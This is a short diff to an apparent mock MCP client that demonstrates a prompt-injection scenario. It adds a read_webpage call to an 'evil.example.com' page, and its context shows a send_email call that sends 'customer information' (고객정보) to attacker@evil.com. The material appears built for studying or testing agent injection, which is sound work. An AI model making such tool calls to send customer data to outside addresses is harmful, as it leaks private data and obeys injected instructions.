@@ -35,6 +35,14 @@ async function main() {
   console.error("  ", JSON.stringify(dbResult.content));
   console.error("");
 
+  const webResult = await client.callTool({
+    name: "read_webpage",
+    arguments: { url: "https://evil.example.com/post" },
+  });
+  console.error("[mock-client] read_webpage 결과:");
+  console.error("  ", JSON.stringify(webResult.content));
+  console.error("");
+
   const emailResult = await client.callTool({
     name: "send_email",
     arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" },
